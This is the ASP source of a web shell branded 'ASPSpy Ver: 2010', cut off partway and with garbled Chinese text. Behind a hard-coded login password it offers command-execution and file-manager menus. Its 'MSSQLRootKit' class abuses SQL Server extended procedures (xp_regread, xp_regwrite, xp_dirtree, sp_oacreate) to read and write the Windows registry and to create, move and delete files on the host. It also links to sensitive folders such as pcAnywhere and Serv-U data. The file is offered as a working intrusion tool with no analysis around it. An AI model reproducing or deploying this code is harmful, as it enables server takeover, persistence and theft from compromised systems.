<object runat='server' id='ws' scope='page' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<html>

<title></title>
<style type="text/css">
.Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}
.list{font:12px Arial,Tahoma;height:23px;}
.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}
</style>
<script>
function js_showFolder(goFolderName){
    document.currentPath.myPath.value=goFolderName;
    document.currentPath.submit();
}
function js_showKey(goFolderName){
    document.keyForm.key.value=goFolderName;
    document.keyForm.submit();
}
function inputBox(jsFname,jsAct){
    document.hiddenForm.FName.value=jsFname;
    document.hiddenForm.act.value=jsAct;
    document.hiddenForm.submit();
}
function inputBox2(jsFname,jsAct,jsTname){
    document.hiddenForm.FName.value=jsFname;
    document.hiddenForm.act.value=jsAct;
	document.hiddenForm.TName.value=jsTname;
    document.hiddenForm.submit();
}
function allSelect(){
	var arr=document.getElementsByName("fileOption");
	for (var i=0;i<arr.length;i=i+1){
		arr[i].checked=document.getElementsByName("chkall")[0].checked;
	}
}
function getSelectFile(){
    var s=new String("");
    var arr=document.getElementsByName("fileOption");
    for (var i=0;i<arr.length;i=i+1){
		if (arr[i].checked){
            s=s+arr[i].value+"ÿ��";
        }
	}
	return s;
}
function askOK(){
    if (window.confirm("ȷ��Ҫ��������")){
        return true;
    }
    return false;
}
function menuGo(action){
	document.hiddenForm.action.value=action;
	document.hiddenForm.submit();
}
function hideObj(obj){
    if (obj.style.display=="none"){
        obj.style.display="";
    }
    else{
         obj.style.display="none";
    }
}
</script>
<%
on error resume next
dim serverIP,serverName,serverPort,password,myName,url,wwwUrl,wwwPath,currentPath,tempWord,isShield,isEnd,T1,T2
tempWord="#" '���net user��һ������ϵͳ���� ��isShield��Ϊtrue ִ��ne#t u#ser ����
isShield=false '��û��һ������
serverIP=Request.ServerVariables("LOCAL_ADDR")
serverName=Request.ServerVariables("SERVER_NAME")
serverPort=Request.ServerVariables("SERVER_PORT")
password="@123"
myName=mid(Request.servervariables("PATH_INFO"),instrrev(Request.servervariables("PATH_INFO"),"/")+1)
url="http://"&Request.ServerVariables("SERVER_NAME")&Request.servervariables("url")
wwwUrl="http://"&Request.ServerVariables("SERVER_NAME")
myPath=server.MapPath(".")
wwwPath=server.MapPath("/")

if myRequest("myPath")<>"" then
	session("currentPath")=myRequest("myPath")
end if
if session("currentpath")="" then
	session("currentPath")=myPath
end if
currentPath=session("currentPath")
isEnd=true
%>
<form name="hiddenForm" method="post" action="<%=myName%>">
<input type="hidden" name="FName" value="">
<input type="hidden" name="TName" value="">
<input type="hidden" name="act" value="">
<input type="hidden" name="action" value="<%=request("action")%>">
</form>
<%
if myRequest("action")="checkLogin" then
	checkLogin()
end if
%>
<body  style="margin:0;table-layout:fixed;">

<%if isLogin()=0 then%>

<br	>
<form name="loginForm" method="post" action="<%=myName%>">
  <label>
  <div id="ljtzC" style=" margin:15px">
  <span style="font:11px Verdana;">Password:</span><input name="password" type="password" class="Bin_Style_Login">
  </label>
  <label>
  <input name="Login" type="submit" class="Bin_Style_Login" value="Login">
  <input type="hidden" name="action" value="checkLogin">
  <p>Copyright &copy; 2010 noName -- <a href="#" target="_blank">noBlog</a>
  </div>
  </label>
</form>
<%elseif isLogin()=1 then%>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;"><a href="#" >ASPSpy Ver: 2010</a></span><span id="Bin_Span_Sname"><%=serverIP%>:<%=serverPort%>(<%=serverName%>)</span></td>
</tr>
<tr class="alt1">
<td><span id="Bin_Span_FrameVersion" style="float:right;"></span>
<a href="?action=logOut">�˳�</a> | <a href="javascript:menuGo('fileManager')">�ļ�����</a> | <a href="javascript:menuGo('systemInfo')">ϵͳ����</a> | <a href="javascript:menuGo('doCmd')">Cmd����</a> | <a href="javascript:menuGo('database')">���ݿ����</a> | <a href="javascript:menuGo('pack')">��վ���</a> | <a href="javascript:menuGo('searchFile')">�����ļ�</a> | <a href="javascript:menuGo('Rootkit')">MSSQLRootKit</a> |
</td>
</tr>
</table>


<%end if%>

</body>
<%
select case myRequest("action")
	case "logOut"
		logOut()
	case "fileManager"
		set fm=new FileManager:fm.main():set fm=nothing
	case "systemInfo":
		set sm=new systemInfo:set sm=nothing
	case "doCmd":
		doCmd()
	case "database":
		set db=new database:set db=nothing
	case "pack":
		set pk=new pack:set pk=nothing	
	case "searchFile":
		searchFile()
	case "Rootkit":
		set rt=new Rootkit:set rt=nothing
		
		
end select
showerr()
showAbout()

function checkLogin() '����½
	if myRequest("password")=password then
		response.Cookies("password")=password
		checkLogin=1
		response.write "<script>menuGo('fileManager')</script>"
	else
		checkLogin=0
	end if 
end function

function isLogin() 'ȷ�ϵ�½
	if Request.Cookies("password")=password then
		isLogin=1
	else 
		isLogin=0
	end if
end function

function logOut()
	response.Cookies("password")=""
	response.Redirect(myName)
end function

class Rootkit
	private conn,output,connStr,isGo,rs,fName,username,password,dbName,ip,port
	private sub class_Initialize()
		'on error resume next
		output=""
		isGo=1
		
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><tr><td><h2 id=""Bin_H2_Title"">RootKit	 &gt;&gt;</h2><br>"
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><td>"
		www output,"<tr class=""alt1""><td colspan=""7"" style=""padding:5px;"">"
		www output,"<a  href=""javascript:inputBox('','rootkitLogin');"">��½</a> | "
		www output,"<a  href=""javascript:inputBox('','fileManager');"">�ļ�����</a> | "
		www output,"<a  href=""javascript:inputBox('','regManager');"">ע������</a> | "
		www output,"<a  href=""javascript:inputBox('','regRW');"">ע����д</a> | "
		www output,"</table><br>"
		
		response.write output
		response.Flush()
		output=""
		connStr=session("rootkit")
		if connStr<>"" then
			set conn=server.CreateObject("adodb.connection")
			conn.ConnectionTimeout=1
			conn.open connStr
			if err<>0 then
				err.clear
			end if
			fName=myRequest("fName")
			tName=myRequest("tName")
			select case myRequest("act")
				case "rootkitLogin":
					rootkitLogin()
				case "fileManager":
					fileManager()
				case "regManager":
					regManager()
				case "editFile":
					editFile fName
				case "renameFolder":
					renameFolder fName,tName
				case "deleteFolder":
					deleteFolder fName
				case "createFolder":
					createFolder fName
				case "renameFile":
					renameFile fName,tName
				case "copyFile":
					copyFile fName,tName
				case "createFile":
					createFile fName
				case "deleteFile":
					deleteFile fName
				case "regRW":
					regRw()
			end select
		else
			if myRequest("act")="rootkitLogin" then
				rootkitlogin()
			else
				www output,"<center><b><font color=""#FF0000"">δ��½</font></b></center>"
			end if
		end if
		

		response.write output
	end sub
	
	public sub rootkitLogin()
		err.clear
		session("rootkit")=""
		on error resume next
		dim conn,connStr
		if myRequest("act2")="save" then
			userName=myRequest("rtusername")
			password=myRequest("rtpassword")
			dbName=myRequest("dbName")
			ip=myRequest("rtip")
			port=myRequest("rtport")
			session("rtusername")=userName
			session("rtpassword")=password
			session("dbname")=dbName
			session("rtip")=ip
			session("rtport")=port
			connStr="Driver={Sql Server};Server="&ip&","&port&";Database="&dbName&";Uid="&userName&";Pwd="&password&""
			set conn=Server.CreateObject("ADODB.connection")
			conn.ConnectionTimeout=1
			conn.open connstr
			if isobject(conn) then
				if conn.state=1 then
					conn.close
				end if
				set conn=nothing
			end if
			if err.number=0 then
				session("rootkit")=connStr
				www output,"<center><b><font color=""#00FF00"">��½�ɹ�</font></b></center>"
				exit sub
			else
				err.clear
				www output,"<center><b><font color=""#FF0000"">��½ʧ��</font></b></center>"
				session("rootkit")=""
			end if
		end if
		tip=session("rtip")
		tport=session("rtport")
		if session("rtip")="" then
			tip="127.0.0.1"
		end if
		if session("rtport")="" then
			tport="1433"
		end if
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0"">"
		www output,"<form name=""rootkitLoginForm"" method=""post"" action="""&myName&""">"
		www output,"<tr><td align=""center"">&nbsp;&nbsp;&nbsp;�˺ţ�"
		www output,"<input name=""rtusername"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""20"" value="""&session("rtusername")&""" /><br>"
		www output,"&nbsp;&nbsp;&nbsp;���룺"
		www output,"<input name=""rtpassword"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""20"" value="""&session("rtpassword")&"""  /><br>"
		www output,"&nbsp;&nbsp;&nbsp;������"
		www output,"<input name=""dbName"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""20"" value="""&session("dbName")&"""  /><br>"
		www output,"&nbsp;&nbsp;&nbsp;��ַ��"
		www output,"<input name=""rtip"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""20"" value="""&tip&"""  /><br>"
		www output,"&nbsp;&nbsp;&nbsp;�˿ڣ�"
		www output,"<input name=""rtport"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""20"" value="""&tport&"""  />"
		www output,"<input type=""hidden"" name=""action"" value=""Rootkit"">"	
		www output,"<input type=""hidden"" name=""act"" value=""rootkitLogin"">"	
		www output,"<input type=""hidden"" name=""act2"" value="""">"	
		www output,"<tr><td align=""center""><input type=""submit"" name=""packSubmit"" value=""�ύ""  class=""bt"" onclick=""document.rootkitLoginForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></td></tr>"	
		www output,"</form>"
		www output,"</table>"
	end sub
	
	public sub fileManager()
		if isGo=1 then
			www output,"<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style=""margin:10px 0;""><tr>"
			www output,"<form name=""currentPath""  action="""&myName&""" method=""post"">"
			www output,"<td style=""white-space:nowrap"">��ǰĿ¼ : </td>"
			www output,"<td style=""width:100%""><input name=""myPath"" type=""text"" class=""input"" style=""width:97%;margin:0 8px;height=22px;"" value="""&session("currentPath")&""" /></td>"
			www output,"<input type=""hidden"" name=""act"" value=""fileManager"">"
			www output,"<input type=""hidden"" name=""action"" value=""Rootkit"">"
			www output,"<td style=""white-space:nowrap"" ><input type=""submit"" name=""viewFolder"" value=""Go""  class=""bt"" /></td>"
			
			www output,"</form>"	
			www output,"</tr></table>"
			
			call getHard()
			showFile(currentPath)
		end if
	end sub
	
	public sub regRW()
		dim rootKey,subKey,item,rs,sqlStr,itemType,wdata
		www output,"<hr><table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0"">"
		www output,"<form name=""regReadForm"" method=""post"" action="""&myName&""">"
		www output,""
		www output,"<tr><td align=""left""><b>��ȡ</b><br>&nbsp;&nbsp;&nbsp;����"
		www output,"<input name=""rkey"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""80"" value="""&myRequest("rkey")&""" />"
		www output,"&nbsp;&nbsp;&nbsp;�"
		www output,"<input name=""ritem"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""20"" value="""&myRequest("ritem")&"""  />"
		www output,"<input type=""hidden"" name=""action"" value=""Rootkit"">"	
		www output,"<input type=""hidden"" name=""act"" value=""regRW"">"	
		www output,"<input type=""hidden"" name=""type"" value=""read"">"	
		www output,"<input type=""hidden"" name=""act2"" value="""">"	
		www output,"<input type=""submit"" name=""rrSubmit"" value=""�ύ""  class=""bt"" onclick=""document.regReadForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></td></tr>"	
		www output,"</form>"
		
		www output,"</table><hr>"
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0"">"
		www output,"<form name=""regWriteForm"" method=""post"" action="""&myName&""">"
		www output,""
		www output,"<tr><td align=""left""><b>д��</b><br>&nbsp;&nbsp;&nbsp;����"
		www output,"<input name=""wkey"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""80"" value="""&myRequest("wkey")&""" />"
		www output,"&nbsp;&nbsp;&nbsp;�"
		www output,"<input name=""witem"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""20"" value="""&myRequest("witem")&"""  />"
		www output,"&nbsp;&nbsp;&nbsp;���ͣ�<select name=""itemType""><option value=""REG_SZ"" >REG_SZ</option><option value=""REG_DWORD"" >REG_DWORD</option></select>"
		www output,"&nbsp;&nbsp;&nbsp;ֵ��"
		www output,"<input name=""wdata"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""20"" value="""&myRequest("wdata")&"""  />"
		www output,"<input type=""hidden"" name=""action"" value=""Rootkit"">"	
		www output,"<input type=""hidden"" name=""act"" value=""regRW"">"	
		www output,"<input type=""hidden"" name=""type"" value=""write"">"	
		www output,"<input type=""hidden"" name=""act2"" value="""">"	
		www output,"<input type=""submit"" name=""rwSubmit"" value=""�ύ""  class=""bt"" onclick=""document.regWriteForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></td></tr>"	
		www output,"</form>"
		
		www output,"</table><hr>"
		if myRequest("type")="read" then
			rootKey=getRootKey(myRequest("rkey"))
			subKey=getsubKey(myRequest("rkey"))
			item=myRequest("ritem")
			if item="" then
				sqlStr="exec master..xp_regread '"&rootKey&"','"&subKey&"',null"
			else
				sqlStr="exec master..xp_regread '"&rootKey&"','"&subKey&"','"&item&"'"
			end if
			set rs=conn.execute(sqlStr)
			if not rs.eof then
				www output,"<center><b>"&rs("data")&"</b></center>"
			end if
		elseif myRequest("type")="write" then
			rootKey=getRootKey(myRequest("wkey"))
			subKey=getsubKey(myRequest("wkey"))
			item=myRequest("witem")
			itemType=myRequest("itemType")
			wdata=myRequest("wdata")
			if item="" then
				sqlStr="exec master..xp_regwrite '"&rootKey&"','"&subKey&"',null,'"&itemType&"','"&wdata&"'"
			else
				sqlStr="exec master..xp_regwrite '"&rootKey&"','"&subKey&"','"&item&"','"&itemType&"','"&wdata&"'"
			end if
			err.clear
			conn.execute(sqlStr)
			if err=0 then
				output="<div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�޸ĳɹ�</div><br>"&output
			end if
		end if
		
	end sub
	
	public sub regManager()
		dim key,rootKey,subKey,currentKey
		key=myRequest("key")
		if key<>"" then 
			session("currentKey")=key
		end if
		currentPath=session("currentKey")
		
		if key<>"" then
			rootKey=getRootKey(key)
			subKey=getSubKey(key)
		else
			rootKey=""
			subKey=""
		end if
		if isGo=1 then
			www output,"<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style=""margin:10px 0;""><tr>"
			www output,"<form name=""keyForm""  action="""&myName&""" method=""post"">"
			www output,"<td style=""white-space:nowrap"">��ǰע���·�� : </td>"
			www output,"<td style=""width:100%""><input name=""key"" type=""text"" class=""input"" style=""width:97%;margin:0 8px;height=22px;"" value="""&key&""" /></td>"
			www output,"<input type=""hidden"" name=""act"" value=""regManager"">"
			www output,"<input type=""hidden"" name=""action"" value=""Rootkit"">"
			www output,"<td style=""white-space:nowrap"" ><input type=""submit"" name=""viewReg"" value=""Go""  class=""bt"" /></td>"
			www output,"</form>"	
			www output,"</tr></table>"
		end if
		showKey rootKey,subKey
	end sub
	
	public function getRootKey(key)
		dim endPot
		endPot=instr(key,"\")
		getRootKey=left(key,endPot-1)
	end function
	public function getSubKey(key)
		dim startPot
		startPot=instr(key,"\")
		getSubKey=mid(key,startPot+1)
	end function
	
	public function getParentKey(key)
		dim endPot
		do while right(key,1)="\"
			key=left(key,len(key)-1)
		loop
		endPot=instrrev(key,"\")
		getParentKey=left(key,endPot)
	end function
	
	
	public sub showKey(rootKey,subKey)
		on error resume next
		dim subKeys,colorChoose,datas
		subKeys=0
		datas=0
		colorChoose=1
		www output,"<table name=""mainTable"">"
		www output,"<tr><td valign=""top""  width=""20%"">"
		www output,"<table style=""width:100%;border-collapse:collapse;"">"
		www output,"<tr class=""head""><td width=""100%""><a href=""javascript:hideObj(document.getElementById('subKey'));""><b>����</b></a></td></tr>"
		www output,"</table>"
	    
		
		www output,"<table  id=""subKey"" cellspacing=""0"" border=""1"" style=""width:100%;border-collapse:collapse;"">"
		
		www output,"<tr class=""alt1"">"
		www output,"<td style=""width:2%;""></td><td><a href=""javascript: js_showKey('"&format(getParentKey(session("currentKey")))&"')"">�����ϼ�Ŀ¼</a></td><td></td><td></td></tr>"
		
		if trim(rootKey)<>"" then
			if trim(subKey)<>"" then
				set rs=conn.execute("exec master..xp_instance_regenumkeys '"&rootKey&"','"&subKey&"'")
			else	
				set rs=conn.execute("exec master..xp_instance_regenumkeys '"&rootKey&"',null")
			end if
			if rs.state=1 then
				do while not rs.eof
					subKeys=subKeys+1
					colorChoose=colorChoose+1
					thisColor=colorChoose mod 2
					if thisColor=0 then
						thisColor=2
					end if
					fd=rs("SubKeyName")
					realFd=rootKey&"\"&subKey&"\"&fd
					realFd=replace(realFd,"\\","\")
					www output,"<tr class=""alt"&thisColor&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&thisColor&"';"">"
					www output,"<td style=""width:2%;""></td>"
					www output,"<td><a href=""javascript: js_showKey('"&format(realFd)&"\\')"" ><b>"&fd&"</b></a></td><td> <a href=""javascript:if (askOK()){ inputBox('"&format(realFd)&"','deleteFolder');}"">ɾ</a></td> <td><a href=""javascript:var path2=window.prompt('��������ļ���','"&format(currentPath)&"\\"&"newFolder');if (path2){ inputBox2('"&format(realFd)&"','renameFolder',path2);}"">��</a></td>"&""
					www output,"</tr>"
					rs.movenext
				loop
			end if
		else
			makeRootKey "HKEY_CLASSES_ROOT",2
			makeRootKey "HKEY_CURRENT_USER",3 
			makeRootKey "HKEY_LOCAL_MACHINE",4 
			makeRootKey "HKEY_USERS",5
			makeRootKey "HKEY_CURRENT_CONFIG",6
		end if
		
		www output,"</table>"
		www output,"</td>"
		'rs.close
		set rs=nothing
		if not err then
			err.clear
		end if
			
		www output,"<td valign=""top""  width=""1200"">"
		www output,"<table cellspacing=""0"" border=""1"" style=""width:100%;border-collapse:collapse;"">"
		www output,"<tr class=""head""><td width=""100%""><a href=""javascript:hideObj(document.getElementById('dataList'));""><b>��</b></a></td></tr>"
		www output,"</table>"
		www output,"<table id=""dataList""  cellspacing=""0"" border=""0"" style=""width:100%;border-collapse:collapse;"">"
		www output,"<tr class=""head"">"
		www output,"<td >&nbsp;</td><td style=""width:25%;"">����</td><td style=""width:25%;"">ֵ</td><td style=""width:15%;""></td><td style=""width:25%;""></td></tr>"
		colorChoose=1
		if trim(rootKey)<>"" then
			set rs=server.CreateObject("adodb.recordset")
			if trim(subKey)<>"" then
				set rs=conn.execute("exec master..xp_regenumvalues '"&rootKey&"','"&subKey&"'")
			else
				set rs=conn.execute("exec master..xp_regenumvalues '"&rootKey&"',null")
			end if
			
			if rs.state=1 then
				do while not rs is nothing
					do while not rs.eof
						colorChoose=colorChoose+1
						thisColor=colorChoose mod 2
						if thisColor=0 then
							thisColor=2
						end if
						www output,"<tr class=""alt"&thisColor&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&thisColor&"';"">"
						www output,"<td style=""width:2%;""><input  type=""checkbox"" value="""&format(realF)&""" name=""fileOption""></td><td><a href=""javascript:return false;"" target=""_blank"">"&rs(0)&"</a></td><td>"&rs("data")&"</td><td>--</td><td><a href=""javascript:inputBox('"&format(f)&"','downFile');""></a>  <a href=""javascript:var path2=window.prompt('���ƺ���ļ�·��','"&format(currentPath)&"\\"&"newFile.asp');if (path2){ inputBox2('"&format(realF)&"','copyFile',path2);}"">����</a> | <a href=""javascript:inputBox('"&format(realF)&"','editFile');"">�༭</a> | <a href=""javascript:var path2=window.prompt('����������ļ�·��','"&format(currentPath)&"\\"&"newFile.asp');if (path2){ inputBox2('"&format(realF)&"','renameFile',path2);}"">������</a>  <a href=""javascript:inputBox('"&format(f)&"','setTime')""></a></td></tr>"
						rs.movenext
					loop
					set rs=rs.nextRecordset()
				loop
			end if
		end if
		
		
		www output,"</tr>"
		www output,"</table>"
		www output,"</table>"
		set rs=nothing
	end sub
	
	private sub makeRootKey(rootKey,thisColor)
		thisColor=thisColor mod 2
		if thisColor=0 then
			thisColor=2
		end if
		www output,"<tr class=""alt"&thisColor&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&thisColor&"';"">"
		www output,"<td style=""width:2%;""></td>"
		www output,"<td><a href=""javascript: js_showKey('"&format(rootKey)&"\\')"" ><b>"&rootKey&"</b></a></td><td> <a href=""javascript:if (askOK()){ inputBox('"&format(rootKey)&"','deleteFolder');}"">ɾ</a></td> <td><a href=""javascript:var path2=window.prompt('����������ļ���·��','"&format(rootKey)&"\\"&"newFolder');if (path2){ inputBox2('"&format(rootKey)&"','renameFolder',path2);}"">��</a></td>"&""
		www output,"</tr>"
	end sub
	
	
	public sub showFile(path) '�õ��ļ�
		dim colorChoose,pathFolder,folders,files,folderCount,fileCount
		colorChoose=1
		fileCount=0
		folderCount=0
		folderCount=0
		www output,"<table name=""mainTable"">"
		www output,"<tr><td valign=""top""  width=""20%"">"
		www output,"<table style=""width:100%;border-collapse:collapse;"">"
		www output,"<tr class=""head""><td width=""100%""><a href=""javascript:hideObj(document.getElementById('folderList'));""><b>�ļ���</b></a></td></tr>"
		www output,"</table>"
	    on error resume next
		set rs=conn.execute("exec master.dbo.xp_dirtree '"&path&"',1,1")

		www output,"<table  id=""folderList"" cellspacing=""0"" border=""0"" style=""width:100%;border-collapse:collapse;"">"
		
		www output,"<tr class=""alt1"">"
		www output,"<td style=""width:2%;""></td><td><a href=""javascript: js_showFolder('"&format(getParentPath(currentPath))&"')"">�����ϼ�Ŀ¼</a></td><td></td><td></td></tr>"
		
		do while not rs.eof
			if cint(rs("file"))=0 then
				folderCount=folderCount+1
				colorChoose=colorChoose+1
				thisColor=colorChoose mod 2
				if thisColor=0 then
					thisColor=2
				end if
				fd=rs("subdirectory")
				realFd=path&"\"&fd
				www output,"<tr class=""alt"&thisColor&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&thisColor&"';"">"
				www output,"<td style=""width:2%;""></td>"
				www output,"<td><a href=""javascript: js_showFolder('"&format(realFd)&"\\')"" ><b>"&fd&"</b></a></td><td> <a href=""javascript:if (askOK()){ inputBox('"&format(realFd)&"','deleteFolder');}"">ɾ</a></td> <td><a href=""javascript:var path2=window.prompt('����������ļ���·��','"&format(currentPath)&"\\"&"newFolder');if (path2){ inputBox2('"&format(realFd)&"','renameFolder',path2);}"">��</a></td>"&""
				www output,"</tr>"
			end if
			rs.movenext
		loop
		
		www output,"</table>"
		www output,"</td>"
		
		rs.movefirst
		if not err then
			err.clear
		end if
		www output,"<td valign=""top""  width=""1200"">"
		www output,"<table cellspacing=""0"" border=""1"" style=""width:100%;border-collapse:collapse;"">"
		www output,"<tr class=""head""><td width=""100%""><a href=""javascript:hideObj(document.getElementById('fileList'));""><b>�ļ�</b></a></td></tr>"
		www output,"</table>"
		www output,"<table id=""fileList""  cellspacing=""0"" border=""0"" style=""width:100%;border-collapse:collapse;"">"
		www output,"<tr class=""head"">"
		www output,"<td >&nbsp;</td><td style=""width:25%;"">�ļ���</td><td style=""width:25%;"">����޸�ʱ��</td><td style=""width:15%;"">�ļ���С</td><td style=""width:25%;"">����</td></tr>"
		do while not rs.eof 
			if cint(rs("file"))=1 then
				fileCount=fileCount+1
				colorChoose=colorChoose+1
				thisColor=colorChoose mod 2
				if thisColor=0 then
					thisColor=2
				end if
				f=rs("subdirectory")
				realF=path&"\"&f
				www output,"<tr class=""alt"&thisColor&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&thisColor&"';"">"
				www output,"<td style=""width:2%;""><input  type=""checkbox"" value="""&format(realF)&""" name=""fileOption""></td><td><a href=""javascript:return false;"" target=""_blank"">"&f&"</a></td><td>--</td><td>--</td><td><a href=""javascript:inputBox('"&format(f)&"','downFile');""></a>  <a href=""javascript:var path2=window.prompt('���ƺ���ļ�·��','"&format(currentPath)&"\\"&"newFile.asp');if (path2){ inputBox2('"&format(realF)&"','copyFile',path2);}"">����</a> | <a href=""javascript:inputBox('"&format(realF)&"','editFile');"">�༭</a> | <a href=""javascript:var path2=window.prompt('����������ļ�·��','"&format(currentPath)&"\\"&"newFile.asp');if (path2){ inputBox2('"&format(realF)&"','renameFile',path2);}"">������</a>  <a href=""javascript:inputBox('"&format(f)&"','setTime')""></a></td></tr>"
			end if
			rs.movenext
		loop
		www output,"<tr class=""alt1""><td><input name=""chkall"" value=""on"" type=""checkbox"" onclick="" allSelect();""></td><td><a href=""javascript:var fNames=getSelectFile();if (fNames!='' & askOK()){inputBox(fNames,'deleteFile');}"">ɾ����ѡ</a></td><td colspan=""4"" style=""text-align:right;""> "&folderCount&" �ļ���/  "&fileCount&" �ļ�</td></tr>"
		www output,"</table>"
		www output,"</td></tr>"
		www output,"</table>"
		set rs=nothing
	end sub
	
	private sub getHard '�õ��̷�
		dim dc
		www output,"<table width=""100%"" border=""0"" cellpadding=""4"" cellspacing=""0"">"
		www output,"<tr class=""alt1""><td colspan=""7"" style=""padding:5px;"">"
		www output,"<a  href=""javascript:var path=window.prompt('�½��ļ���·��','"&format(currentPath)&"\\"&"newFolder');if (path){ inputBox(path,'createFolder');}"">����Ŀ¼</a> | "
		www output,"<a  href=""javascript:var path=window.prompt('�½��ļ�·��','"&format(currentPath)&"\\"&"newfile.asp');if (path){ inputBox(path,'createFile');}"">�����ļ�</a> | "
		www output,"<br>"
		www output,"<a  href=""javascript:js_showFolder('"&format(wwwPath)&"')"">��վ��Ŀ¼</a> | "
		www output,"<a  href=""javascript:js_showFolder('"&format(myPath)&"')"">������Ŀ¼</a> | "
		set fso=server.CreateObject("scripting.filesystemobject")
		set dc=fso.Drives
		For Each d In dc
			if d.DriveType=2 then
				www output,"<a  href=""javascript: js_showFolder('"&format(d.driveletter)&":\\"&"')"">����("&d.driveletter&")</a> | "
			end if
		Next
		For Each d In dc
			if d.DriveType=2 then
				www output,"<a  href=""javascript: js_showFolder('"&format(d.driveletter)&":\\Recycler"&"')"">"&d.driveletter&"\Recycler</a> | "
			end if
		Next
		set fso=nothing
		www output,"<a  href=""javascript:js_showFolder('C:\\WINDOWS\\Temp')"">temp</a> | "
		www output,"<a  href=""javascript:js_showFolder('d:\\iislog')"">IISLog</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Documents and Settings')"">Documents</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\wmpub')"">wmpub</a> | "
		www output,"<a  href=""javascript:js_showFolder('c:\\docume~1\\alluse~1\\Application Data\\Symantec\\pcAnywhere')"">PCAnyWhere</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Program Files\\RhinoSoft.com')"">Su</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\php')"">PHP</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Program Files\\Microsoft SQL Server')"">MSSQL</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Documents and Settings\\All Users\\����')"">����</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Documents and Settings\\All Users\\����ʼ���˵�')"">��ʼ�˵�</a> | "
		
		www output,"</td></tr>"
		www output,"</table>"
	end sub
	
	private sub deleteFile(path)
		on error resume next
		err.clear
		dim msg1,msg2
		msg1=""
		msg2=""
		path=split(path,"ÿ��") 
		for i=0 to ubound(path)
			sqlStr="declare @fso int;exec master..sp_oacreate 'scripting.filesystemobject',@fso out;exec master..sp_oamethod @fso,'deletefile',null,'"&path(i)&"'"
			conn.execute(sqlStr)
		next
		if err=0 then
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">ɾ���ļ��ɹ�</div><br>"
		end if
	end sub
	
	private sub renameFolder(path1,path2)
		on error resume next
		sqlStr="declare @fso int;exec master..sp_oacreate 'scripting.filesystemobject',@fso out;exec master..sp_oamethod @fso,'movefolder',null,'"&path1&"','"&path2&"'"
		conn.execute(sqlStr)
		if err=0 then
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�ƶ��ļ��гɹ�</div><br>"
		end if
	end sub
	
	private sub createFolder(path)
		on error resume next
		sqlStr="declare @fso int;exec master..sp_oacreate 'scripting.filesystemobject',@fso out;exec master..sp_oamethod @fso,'createfolder',null,'"&path&"'"
		conn.execute(sqlStr)
		if err=0 then
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�����ļ��гɹ�</div><br>"
		end if
	end sub
	
	
